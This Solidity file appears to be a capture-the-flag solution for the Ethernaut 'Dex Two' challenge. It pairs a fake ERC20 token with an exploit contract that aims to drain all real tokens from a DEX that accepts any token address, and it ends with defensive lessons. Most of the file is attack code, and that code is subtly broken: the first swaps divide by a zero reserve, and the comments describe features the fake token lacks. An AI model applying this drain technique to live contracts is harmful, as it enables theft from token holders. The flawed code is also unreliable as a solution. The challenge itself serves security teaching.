// Ethernaut Challenge #23: Dex Two
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
 * DEX TWO CHALLENGE
 * 
 * Goal: Drain all token types from the DEX.
 * 
 * THE VULNERABILITY:
 * The DEX allows swapping ANY token, not just the whitelisted ones.
 * 
 * We can deploy a fake token with:
 * - balanceOf() returns arbitrary values (lie about reserves)
 * - transfer() does nothing or mints tokens
 * - Or simply create a worthless token and swap it for real ones
 * 
 * ATTACK STRATEGY:
 * 1. Deploy fake token
 * 2. Add liquidity to DEX (swap in fake token)
 * 3. Swap fake token for real tokens
 * 4. Because our fake token has no value, we get real tokens for free
 */

contract FakeToken {
    string public name = "FakeToken";
    string public symbol = "FAKE";
    uint8 public decimals = 18;
    
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    
    constructor() {
        balanceOf[msg.sender] = 1000000 * 10**18;
    }
    
    function transfer(address to, uint amount) public returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint amount) public returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function approve(address spender, uint amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract DexTwoExploit {
    DexTwo public target;
    FakeToken public fake;
    address public token1;
    address public token2;
    
    constructor(address _target) {
        target = DexTwo(_target);
        token1 = target.token1();
        token2 = target.token2();
        
        // Deploy fake token
        fake = new FakeToken();
    }
    
    function attack() external {
        // Approve DEX to spend fake tokens
        fake.approve(address(target), type(uint).max);
        
        // Step 1: "Sell" fake tokens to DEX to build "reserves"
        // DEX thinks it now has fake tokens
        target.swap(address(fake), token1, 1);
        target.swap(address(fake), token2, 1);
        
        // Step 2: Now swap fake tokens for ALL real tokens
        // Because DEX has a "price" for fake tokens based on previous swaps,
        // we can drain everything
        
        uint fakeBalance = fake.balanceOf(address(this));
        target.swap(address(fake), token1, fakeBalance / 2);
        target.swap(address(fake), token2, fakeBalance / 2);
    }
}

contract DexTwo {
    address public token1;
    address public token2;
    
    function swap(address from, address to, uint amount) public {
        // NO VALIDATION that from/to are legitimate tokens!
        // This is the vulnerability
        
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough");
        
        uint swapAmount = getSwapAmount(from, to, amount);
        
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }
    
    function getSwapAmount(address from, address to, uint amount) public view returns (uint) {
        return ((amount * IERC20(to).balanceOf(address(this))) / 
                IERC20(from).balanceOf(address(this)));
    }
    
    function approve(address spender, uint amount) public {}
}

interface IERC20 {
    function transferFrom(address, address, uint) external returns (bool);
    function balanceOf(address) external view returns (uint);
    function approve(address, uint) external returns (bool);
}

/*
 * ATTACK STEPS:
 * 
 * 1. Deploy FakeToken with infinite supply
 * 2. Deploy DexTwoExploit with target DEX address
 * 3. Call attack():
 *    - Swap 1 fake token for some token1
 *    - This establishes "price" for fake token
 *    - Keep swapping fake for real until DEX is drained
 * 
 * The DEX has no whitelist - it trusts any ERC20.
 * Fake tokens cost us nothing to mint.
 * 
 * LESSON:
 * - Always validate token addresses against a whitelist
 * - Don't let users specify arbitrary contract addresses
 * - Unknown tokens can have malicious implementations
 * - Real DEXs have token lists and validation
 */
